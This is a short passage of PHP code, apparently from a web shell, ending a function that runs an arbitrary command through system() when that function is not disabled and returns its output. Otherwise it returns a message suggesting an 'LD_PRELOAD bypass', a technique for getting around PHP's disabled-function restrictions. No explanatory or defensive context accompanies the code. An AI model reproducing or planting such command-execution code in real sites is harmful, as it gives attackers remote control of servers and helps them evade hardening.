    }

    if (function_exists('system') && !smileIsDisabled('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        return ob_get_clean();
    }

    return 'No execution function available. Try LD_PRELOAD bypass manually.';
}
